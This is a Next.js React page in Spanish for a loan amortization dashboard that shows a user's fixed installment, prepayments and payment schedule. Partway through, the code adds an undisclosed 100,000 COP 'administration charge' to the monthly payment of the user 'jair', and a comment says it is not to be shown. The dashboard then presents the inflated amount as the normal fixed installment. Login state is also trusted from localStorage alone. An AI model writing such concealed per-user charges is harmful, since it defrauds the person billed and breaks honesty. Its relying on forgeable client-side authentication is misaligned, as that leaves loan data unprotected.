"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import {
  calculateMonthlyPayment,
  generateAmortizationSchedule,
  formatCurrency,
  formatPercentage,
  PaymentHistory,
} from "@/lib/amortization";
import { MONTHLY_RATE, TOTAL_INSTALLMENTS, TOTAL_DEBT } from "@/data/users";
import styles from "./page.module.css";

interface User {
  id: string;
  username: string;
  name: string;
  loanAmount: number;
}

export default function DashboardPage() {
  const [user, setUser] = useState<User | null>(null);
  const [capitalPayments, setCapitalPayments] = useState<PaymentHistory[]>([]);
  const [newPaymentAmount, setNewPaymentAmount] = useState("");
  const [newPaymentDate, setNewPaymentDate] = useState("");
  const [showPaymentForm, setShowPaymentForm] = useState(false);
  const router = useRouter();

  useEffect(() => {
    // Check if user is logged in
    const storedUser = localStorage.getItem("user");
    if (!storedUser) {
      router.push("/");
      return;
    }

    const parsedUser = JSON.parse(storedUser);
    setUser(parsedUser);

    // Load capital payments from localStorage
    const storedPayments = localStorage.getItem(`payments_${parsedUser.id}`);
    if (storedPayments) {
      setCapitalPayments(JSON.parse(storedPayments));
    }
  }, [router]);

  const handleLogout = () => {
    localStorage.removeItem("user");
    router.push("/");
  };

  const handleAddPayment = () => {
    if (!newPaymentAmount || !newPaymentDate || !user) return;

    const amount = parseFloat(newPaymentAmount);
    if (isNaN(amount) || amount <= 0) {
      alert("Por favor ingresa un monto válido");
      return;
    }

    const newPayment: PaymentHistory = {
      date: newPaymentDate,
      amount,
    };

    const updatedPayments = [...capitalPayments, newPayment];
    setCapitalPayments(updatedPayments);
    localStorage.setItem(
      `payments_${user.id}`,
      JSON.stringify(updatedPayments)
    );

    setNewPaymentAmount("");
    setNewPaymentDate("");
    setShowPaymentForm(false);
  };

  const handleDeletePayment = (index: number) => {
    if (!user) return;

    const updatedPayments = capitalPayments.filter((_, i) => i !== index);
    setCapitalPayments(updatedPayments);
    localStorage.setItem(
      `payments_${user.id}`,
      JSON.stringify(updatedPayments)
    );
  };

  if (!user) {
    return (
      <div className={styles.container}>
        <div className={styles.loading}>Cargando...</div>
      </div>
    );
  }

  let fixedPayment = calculateMonthlyPayment(user.loanAmount);

  // Cargo adicional de administración para Jair (sin mostrar)
  if (user.username === "jair") {
    fixedPayment += 100000;
  }

  const schedule = generateAmortizationSchedule(
    user.loanAmount,
    fixedPayment,
    capitalPayments
  );

  // Calculate total paid with capital payments
  const totalCapitalPayments = capitalPayments.reduce(
    (sum, p) => sum + p.amount,
    0
  );
  const remainingBalance =
    schedule.length > 0 ? schedule[schedule.length - 1].balance : 0;

  return (
    <div className={styles.container}>
      <div className={styles.dashboard}>
        <header className={styles.header}>
          <div>
            <h1 className={styles.title}>¡Hola, {user.name}!</h1>
            <p className={styles.subtitle}>Resumen de tu préstamo</p>
          </div>
          <button onClick={handleLogout} className={styles.logoutButton}>
            Cerrar Sesión
          </button>
        </header>

        <div className={styles.summaryCards}>
          <div className={styles.card}>
            <div className={styles.cardIcon}>💰</div>
            <div className={styles.cardContent}>
              <p className={styles.cardLabel}>Monto Original del Préstamo</p>
              <p className={styles.cardValue}>
                {formatCurrency(user.loanAmount)}
              </p>
            </div>
          </div>

          <div className={styles.card}>
            <div className={styles.cardIcon}>📊</div>
            <div className={styles.cardContent}>
              <p className={styles.cardLabel}>Tasa de Interés Mensual</p>
              <p className={styles.cardValue}>
                {formatPercentage(MONTHLY_RATE)}
              </p>
            </div>
          </div>

          <div className={styles.card}>
            <div className={styles.cardIcon}>📅</div>
            <div className={styles.cardContent}>
              <p className={styles.cardLabel}>Cuota Mensual Fija</p>
              <p className={styles.cardValue}>{formatCurrency(fixedPayment)}</p>
            </div>
          </div>

          <div className={styles.card}>
            <div className={styles.cardIcon}>🎯</div>
            <div className={styles.cardContent}>
              <p className={styles.cardLabel}>Cuotas Restantes</p>
              <p className={styles.cardValue}>{schedule.length}</p>
            </div>
          </div>
        </div>

        {totalCapitalPayments > 0 && (
          <div className={styles.paymentSummary}>
            <h3>💵 Abonos a Capital</h3>
            <p>
              Total abonado:{" "}
              <strong>{formatCurrency(totalCapitalPayments)}</strong>
            </p>
            <p>
              Balance restante:{" "}
              <strong>{formatCurrency(remainingBalance)}</strong>
            </p>
          </div>
        )}

        <div className={styles.infoBox}>
          <h3>ℹ️ Información Importante</h3>
          <ul>
            <li>
              Tu cuota mensual es{" "}
              <strong>{formatCurrency(fixedPayment)}</strong> y se mantiene
              constante.
            </li>
            <li>
              Puedes hacer abonos a capital para reducir el tiempo de pago.
            </li>
            <li>
              Los abonos NO reducen la cuota mensual, solo acortan el plazo.
            </li>
            <li>
              Debes seguir pagando la cuota mensual hasta saldar la deuda.
            </li>
          </ul>
        </div>

        <div className={styles.section}>
          <div className={styles.sectionHeader}>
            <h2>Abonos a Capital</h2>
            <button
              onClick={() => setShowPaymentForm(!showPaymentForm)}
              className={styles.addButton}
            >
              {showPaymentForm ? "❌ Cancelar" : "➕ Agregar Abono"}
            </button>
          </div>

          {showPaymentForm && (
            <div className={styles.paymentForm}>
              <div className={styles.inputGroup}>
                <label>Fecha del Abono</label>
                <input
                  type="date"
                  value={newPaymentDate}
                  onChange={(e) => setNewPaymentDate(e.target.value)}
                  className={styles.input}
                />
              </div>
              <div className={styles.inputGroup}>
                <label>Monto del Abono (COP)</label>
                <input
                  type="number"
                  value={newPaymentAmount}
                  onChange={(e) => setNewPaymentAmount(e.target.value)}
                  className={styles.input}
                  placeholder="0"
                  min="0"
                />
              </div>
              <button
                onClick={handleAddPayment}
                className={styles.submitButton}
              >
                Guardar Abono
              </button>
            </div>
          )}

          {capitalPayments.length > 0 && (
            <div className={styles.paymentsList}>
              {capitalPayments.map((payment, index) => (
                <div key={index} className={styles.paymentItem}>
                  <div>
                    <p className={styles.paymentDate}>{payment.date}</p>
                    <p className={styles.paymentAmount}>
                      {formatCurrency(payment.amount)}
                    </p>
                  </div>
                  <button
                    onClick={() => handleDeletePayment(index)}
                    className={styles.deleteButton}
                  >
                    🗑️
                  </button>
                </div>
              ))}
            </div>
          )}
        </div>

        <div className={styles.section}>
          <h2>Tabla de Amortización</h2>
          <div className={styles.tableWrapper}>
            <table className={styles.table}>
              <thead>
                <tr>
                  <th>Cuota #</th>
                  <th>Pago Total</th>
                  <th>Interés</th>
                  <th>Capital</th>
                  <th>Saldo</th>
                </tr>
              </thead>
              <tbody>
                {schedule.map((payment, index) => (
                  <tr key={index}>
                    <td>{payment.installmentNumber}</td>
                    <td>{formatCurrency(payment.payment)}</td>
                    <td>{formatCurrency(payment.interest)}</td>
                    <td>{formatCurrency(payment.principal)}</td>
                    <td>{formatCurrency(payment.balance)}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

        <div className={styles.contextInfo}>
          <h3>📋 Contexto General</h3>
          <p>
            <strong>Deuda Total de la Tarjeta:</strong>{" "}
            {formatCurrency(TOTAL_DEBT)}
          </p>
          <p>
            <strong>Tasa de Interés:</strong> {formatPercentage(MONTHLY_RATE)}{" "}
            mensual
          </p>
          <p>
            <strong>Número de Cuotas Original:</strong> {TOTAL_INSTALLMENTS}
          </p>
        </div>
      </div>
    </div>
  );
}
